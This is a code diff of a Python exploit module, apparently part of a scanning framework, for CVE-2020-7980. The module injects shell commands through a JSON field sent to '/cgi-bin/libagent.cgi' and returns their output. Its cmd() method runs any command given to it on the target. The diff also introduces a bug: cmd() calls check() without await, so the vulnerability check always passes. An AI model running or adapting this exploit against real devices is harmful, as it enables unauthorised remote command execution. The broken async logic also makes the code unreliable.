@@ -2,8 +2,8 @@
 
 import time
 import calendar
-from app.lib.utils.request import request
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.common import get_capta, get_useragent
 
 class CVE_2020_7980_BaseVerify:
     def __init__(self, url):
@@ -33,7 +33,7 @@ class CVE_2020_7980_BaseVerify:
                 }
         }
 
-    def check(self):
+    async def check(self):
     
         """
         
@@ -45,19 +45,14 @@ class CVE_2020_7980_BaseVerify:
         """
         try:
             self.data['P1_']['Q'] = 'echo %s' % (self.capta)
-            cmd_request = request.post(self.url + '/cgi-bin/libagent.cgi?type=J&' + str(calendar.timegm(time.gmtime())) + '000', json = self.data, cookies = {'ctr_t': '0', 'sid': '123456789'})
-            if cmd_request.status_code == 200 and self.capta in cmd_request.text:
+            cmd_request = await request.post(self.url + '/cgi-bin/libagent.cgi?type=J&' + str(calendar.timegm(time.gmtime())) + '000', json = self.data, cookies = {'ctr_t': '0', 'sid': '123456789'})
+            if cmd_request.status == 200 and self.capta in await cmd_request.text():
                 return True
-            else:
-                print("不存在CVE-2020-7980漏洞")
-                return False
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
     
-    def cmd(self, cmd):
+    async def cmd(self, cmd):
     
         """
         执行命令
@@ -70,14 +65,14 @@ class CVE_2020_7980_BaseVerify:
         try:
             if self.check():
                 self.data['P1_']['Q'] = cmd
-                cmd_request = request.post(self.url + '/cgi-bin/libagent.cgi?type=J&' + str(calendar.timegm(time.gmtime())) + '000', json = self.data, cookies = {'ctr_t': '0', 'sid': '123456789'})
-                result = cmd_request.text.split()[-2].replace('},', '')
+                cmd_request = await request.post(self.url + '/cgi-bin/libagent.cgi?type=J&' + str(calendar.timegm(time.gmtime())) + '000', json = self.data, cookies = {'ctr_t': '0', 'sid': '123456789'})
+                result = await cmd_request.text()
+                result = result.split()[-2].replace('},', '')
                 return True, result
-            else:
-                return False, '不存在CVE-2020-7980漏洞!'
+            
         except Exception as e:
-            print(e)
-            return False, e
+            # print(e)
+            pass
         finally:
             pass
 
